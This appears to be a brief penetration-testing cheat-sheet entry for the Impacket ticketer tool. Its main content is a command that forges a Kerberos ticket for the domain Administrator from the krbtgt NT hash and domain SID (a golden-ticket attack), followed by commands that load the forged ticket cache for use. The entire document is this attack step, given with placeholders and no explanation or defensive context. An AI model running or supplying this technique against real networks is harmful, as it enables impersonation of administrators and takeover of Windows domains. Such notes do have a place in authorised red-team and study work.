# Impacket-ticketer 

### Use this module to create a ticket for a specific user you have access

    ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator

    export KRB5CCNAME=/home/user/ticket.ccache

    cat $KRB5CCNAME
